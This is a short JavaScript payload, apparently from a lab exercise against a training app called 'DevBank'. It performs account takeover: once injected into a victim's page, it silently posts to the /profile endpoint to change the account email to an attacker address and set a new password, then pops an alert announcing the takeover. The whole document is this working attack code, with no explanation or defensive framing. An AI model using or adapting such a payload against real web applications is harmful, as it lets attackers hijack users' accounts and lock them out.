// DevBank B.2 payload — account takeover via /profile
(async function () {
  try {
    await fetch('/profile', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'email=pwned@attacker.com&password=Hacked123!'
    });
    alert('Account taken over! Email and password changed.');
  } catch (e) {
    alert('Payload failed: ' + e.message);
  }
})();
